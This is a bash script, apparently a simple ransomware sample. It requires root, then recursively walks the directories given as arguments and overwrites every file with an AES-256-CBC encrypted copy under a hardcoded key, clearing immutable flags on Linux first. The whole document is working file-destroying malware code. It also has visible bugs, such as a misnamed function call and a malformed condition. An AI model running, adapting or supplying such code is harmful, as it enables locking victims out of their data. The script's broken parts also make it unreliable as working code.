#!/bin/bash

# Global Vars
ERRMSG=""
OS=""

get_os() {
	if [[$(uname -s | grep Linux) != ""]]; then
		OS="linux"
	elif [[ $( uname -s | grep BSD) != "" ]]; then
		OS="bsd"
	else
		adderr "[!] NOT \"Linux\" or \"BSD\""
		EXIT
	fi
}

openfile() {
	if [[ $OS == "linux" ]]; then
		chmod +rw $1
		chattr -i $1
	fi
	if [[ $OS == "bsd" ]]; then
		chmod +rw $1
		chflags schg $1
	fi
}

adderr() {
	ERRMSG="$ERRMSG\n$1"
}

EXIT() {
	echo -e "[+] DUMPING MESSAGES:$ERRMSG\n[!] EXITING"
	exit
}

noopenssl() {
	adderr "[!] NO OPENSSL FOUND"
	EXIT
}

notroot() {
	adderr "[!] NOT ROOT"
	EXIT
}

check_req() {
	# check the requirements
	if [[ "$(whoami)" != "root" ]]; then
		notroot
	fi
	if [[ "$(which openssl)" == "" ]]; then
		notopenssl
	fi
}

init() {
	KEY="PASSWORD"
}
#encrypt the file (pack = pck)
pck() {
	openfile $1
	stuff=$(cat $1)
	echo "RAN" > $1
	echo -e "$stuff" | openssl aes-256-cbc -k $KEY -out $1
	if [ ! -f "$1" ]; then
		adderr "[!] FILE NOT ENCRYPTED"
		EXIT
	fi
	adderr "[+] Encrypted $1"
}
#start decrypt
dec() {
	PRIVATEKEY="private.key"
	echo -e "$KEY" > $PRIVATEKEY
}
#unpack
upk() {
	openssl aes-256-cbc -d -kfile $PRIVATEKEY -in $1 -out $1.dec
	mv $1.dec $1
}

navdir() {
files=( $1 )
for fil in ${files[@]}; do
	if [ -f "$fil" ]; then
		$2 $fil
	elif [ -d "$fil" ]; then
		navdir "$fil/*" "$2"
	fi
done
}

check_req
init
for i in $@; do
	navdir "$i*" "pck"
done
EXIT
